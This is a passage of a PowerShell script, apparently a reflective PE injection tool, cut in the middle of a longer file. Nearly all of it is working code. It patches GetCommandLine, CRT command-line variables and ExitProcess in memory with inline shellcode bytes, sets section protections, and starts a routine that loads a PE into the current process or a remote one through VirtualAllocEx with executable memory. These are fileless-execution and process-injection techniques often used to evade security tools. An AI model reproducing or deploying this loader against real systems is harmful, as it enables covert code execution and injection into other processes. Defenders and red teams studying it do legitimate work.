					if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
					}
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
					{
						[IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
					}
					else
					{
						[IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
						$StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                        $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
					}
					
					if ($RemoteLoading -eq $true)
					{
						[IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
					}
					else
					{
				        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
					}
					
					if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
					{
                        if ($LoadByOrdinal)
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath"
                        }
                        else
                        {
						    Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                        }
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
					
					$ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                    #Cleanup
                    #If loading by ordinal, ProcedureNamePtr is the ordinal value and not actually a pointer to a buffer that needs to be freed
                    if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
                        $ProcedureNamePtr = [IntPtr]::Zero
                    }
				}
				
				$ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}

	Function Get-VirtualProtectValue
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$SectionCharacteristics
		)
		
		$ProtectionFlag = 0x0
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_READWRITE
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_READONLY
				}
			}
			else
			{
				if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
				}
				else
				{
					$ProtectionFlag = $Win32Constants.PAGE_NOACCESS
				}
			}
		}
		
		if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
		}
		
		return $ProtectionFlag
	}

	Function Update-MemoryProtectionFlags
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		
		for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
			
			[UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
			[UInt32]$SectionSize = $SectionHeader.VirtualSize
			
			[UInt32]$OldProtectFlag = 0
			Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
			$Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Unable to change memory protection"
			}
		}
	}
	
	#This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
	#Returns an object with addresses to copies of the bytes that were overwritten (and the count)
	Function Update-ExeFunctions
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ExeArguments,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		$ExeDoneBytePtr
		)
		
		#This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
		$ReturnArray = @() 
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]$OldProtectFlag = 0
		
		[IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
		if ($Kernel32Handle -eq [IntPtr]::Zero)
		{
			throw "Kernel32 handle null"
		}
		
		[IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
		if ($KernelBaseHandle -eq [IntPtr]::Zero)
		{
			throw "KernelBase handle null"
		}

		#################################################
		#First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
		#	We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
		$CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
		$CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
	
		[IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
		[IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

		if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
		{
			throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
		}

		#Prepare the shellcode
		[Byte[]]$Shellcode1 = @()
		if ($PtrSize -eq 8)
		{
			$Shellcode1 += 0x48	#64bit shellcode has the 0x48 before the 0xb8
		}
		$Shellcode1 += 0xb8
		
		[Byte[]]$Shellcode2 = @(0xc3)
		$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
		
		
		#Make copy of GetCommandLineA and GetCommandLineW
		$GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
		$Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
		$Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
		$ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
		$ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

		#Overwrite GetCommandLineA
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineAAddrTemp = $GetCommandLineAAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
		$GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		
		
		#Overwrite GetCommandLineW
		[UInt32]$OldProtectFlag = 0
		$Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
		if ($Success = $false)
		{
			throw "Call to VirtualProtect failed"
		}
		
		$GetCommandLineWAddrTemp = $GetCommandLineWAddr
		Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
		$GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
		Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
		
		$Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		#################################################
		
		
		#################################################
		#For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
		#	I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
		#	It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
		#	argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
		$DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
			, "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
		
		foreach ($Dll in $DllList)
		{
			[IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
			if ($DllHandle -ne [IntPtr]::Zero)
			{
				[IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
				[IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
				if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
				{
					"Error, couldn't find _wcmdln or _acmdln"
				}
				
				$NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
				$NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
				
				#Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
				$OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
				$OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
				$OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				$OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
				$ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
				$ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
				
				$Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
				
				$Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
				if ($Success = $false)
				{
					throw "Call to VirtualProtect failed"
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
				$Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
			}
		}
		#################################################
		
		
		#################################################
		#Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

		$ReturnArray = @()
		$ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
		
		#CorExitProcess (compiled in to visual studio c++)
		[IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
		if ($MscoreeHandle -eq [IntPtr]::Zero)
		{
			throw "mscoree handle null"
		}
		[IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
		if ($CorExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "CorExitProcess address not found"
		}
		$ExitFunctions += $CorExitProcessAddr
		
		#ExitProcess (what non-managed programs use)
		[IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
		if ($ExitProcessAddr -eq [IntPtr]::Zero)
		{
			Throw "ExitProcess address not found"
		}
		$ExitFunctions += $ExitProcessAddr
		
		[UInt32]$OldProtectFlag = 0
		foreach ($ProcExitFunctionAddr in $ExitFunctions)
		{
			$ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
			#The following is the shellcode (Shellcode: ExitThread.asm):
			#32bit shellcode
			[Byte[]]$Shellcode1 = @(0xbb)
			[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			#64bit shellcode (Shellcode: ExitThread.asm)
			if ($PtrSize -eq 8)
			{
				[Byte[]]$Shellcode1 = @(0x48, 0xbb)
				[Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]$Shellcode3 = @(0xff, 0xd3)
			$TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
			
			[IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
			if ($ExitThreadAddr -eq [IntPtr]::Zero)
			{
				Throw "ExitThread address not found"
			}

			$Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			#Make copy of original ExitProcess bytes
			$ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
			$Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
			$ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
			
			#Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
			#	call ExitThread
			Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
			$ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
			Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

			$Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
		#################################################

		Write-Output $ReturnArray
	}
	
	
	#This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
	#	It copies Count bytes from Source to Destination.
	Function Copy-ArrayOfMemAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		$CopyInfo,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)

		[UInt32]$OldProtectFlag = 0
		foreach ($Info in $CopyInfo)
		{
			$Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
			if ($Success -eq $false)
			{
				Throw "Call to VirtualProtect failed"
			}
			
			$Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			$Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
	}


	#####################################
	##########    FUNCTIONS   ###########
	#####################################
	Function Get-MemoryProcAddress
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FunctionName
		)
		
		$Win32Types = Get-Win32Types
		$Win32Constants = Get-Win32Constants
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		#Get the export table
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		
		for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
		{
			#AddressOfNames is an array of pointers to strings of the names of the functions exported
			$NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

			if ($Name -ceq $FunctionName)
			{
				#AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
				#    which contains the offset of the function in to the DLL
				$OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
				$FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
				return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
			}
		}
		
		return [IntPtr]::Zero
	}


	Function Invoke-MemoryLoadLibrary
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		$ExeArgs,
		
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle,

        [Parameter(Position = 3)]
        [Bool]
        $ForceASLR = $false
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		#Get Win32 constants and functions
		$Win32Constants = Get-Win32Constants
		$Win32Functions = Get-Win32Functions
		$Win32Types = Get-Win32Types
		
		$RemoteLoading = $false
		if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$RemoteLoading = $true
		}
		
		#Get basic PE information
		Write-Verbose "Getting basic PE information from the file"
		$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
		$OriginalImageBase = $PEInfo.OriginalImageBase
		$NXCompatible = $true
		if (($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$NXCompatible = $false
		}
		
		
		#Verify that the PE and the current process are the same bits (32bit or 64bit)
		$Process64Bit = $true
		if ($RemoteLoading -eq $true)
		{
			$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
			$Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
			if ($Result -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
			}
			
			[Bool]$Wow64Process = $false
			$Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
			if ($Success -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}
			
			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$Process64Bit = $false
			}
			
			#PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
			$PowerShell64Bit = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$PowerShell64Bit = $false
			}
			if ($PowerShell64Bit -ne $Process64Bit)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$Process64Bit = $false
			}
		}
		if ($Process64Bit -ne $PEInfo.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}
		

		#Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
		Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
        #ASLR check
		[IntPtr]$LoadAddr = [IntPtr]::Zero
        $PESupportsASLR = ($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
		if ((-not $ForceASLR) -and (-not $PESupportsASLR))
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)" -WarningAction Continue
			[IntPtr]$LoadAddr = $OriginalImageBase
		}
        elseif ($ForceASLR -and (-not $PESupportsASLR))
        {
            Write-Verbose "PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash."
        }

        if ($ForceASLR -and $RemoteLoading)
        {
            Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
        }
        if ($RemoteLoading -and (-not $PESupportsASLR))
        {
            Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
        }

		$PEHandle = [IntPtr]::Zero				#This is where the PE is allocated in PowerShell
		$EffectivePEHandle = [IntPtr]::Zero		#This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
		if ($RemoteLoading -eq $true)
		{
			#Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
			$PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			#todo, error handling needs to delete this memory if an error happens along the way
			$EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($EffectivePEHandle -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($NXCompatible -eq $true)
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$EffectivePEHandle = $PEHandle
		}
		
		[IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
		if ($PEHandle -eq [IntPtr]::Zero)
		{ 
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		#Now that the PE is in memory, get more detailed information about it
		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
